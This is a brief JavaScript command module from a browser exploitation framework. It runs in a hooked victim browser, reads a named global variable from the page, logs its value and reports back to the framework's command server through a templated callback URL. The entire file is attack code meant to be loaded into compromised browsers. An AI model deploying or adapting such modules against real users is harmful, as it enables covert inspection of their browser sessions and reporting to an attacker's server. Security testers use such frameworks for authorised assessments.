//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

/*
This JavaScript gets value of the specified variable that was set in another script via Window property.
*/

server.execute(function() {

 var payload = "<%= @payload_name %>";
 var curl = "<%= @command_url %>";
 var cid = "<%= @command_id %>";
 
 server.debug("The current value of " + payload + " is " + Window[payload]);
 server.net.send(curl, parseInt(cid),'get_variable=true');

});
